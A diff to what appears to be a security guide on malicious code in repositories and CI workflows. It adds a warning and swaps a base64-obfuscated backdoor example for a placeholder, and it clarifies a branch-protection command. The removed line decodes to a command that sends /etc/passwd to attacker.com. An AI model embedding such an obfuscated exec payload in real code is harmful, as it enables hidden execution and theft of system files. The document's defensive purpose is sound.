@@ -238,9 +238,10 @@ Even with human review, malicious code might slip through:
 
 **Example 1: Obfuscated Backdoor**
 ```python
+# ⚠️ WARNING: Example of malicious code pattern - DO NOT RUN
 # Looks innocent but decodes to malicious code
 import base64
-exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBhdHRhY2tlci5jb20vJiQoY2F0IC9ldGMvcGFzc3dkKScp"))
+exec(base64.b64decode("PHBsYWNlaG9sZGVyPg=="))  # Placeholder - real attacks use actual commands
 ```
 
 **Example 2: Time Bomb**
@@ -753,7 +754,8 @@ Attacker gains write access to workflows and modifies them to:
 1. **Branch Protection**
    ```bash
    # Protect main branch
-   gh api repos/{owner}/{repo}/branches/main/protection \
+   # Replace <owner> and <repo> with your GitHub username/org and repository name
+   gh api repos/<owner>/<repo>/branches/main/protection \
      --method PUT \
      --field required_pull_request_reviews[required_approving_review_count]=2 \
      --field enforce_admins=true
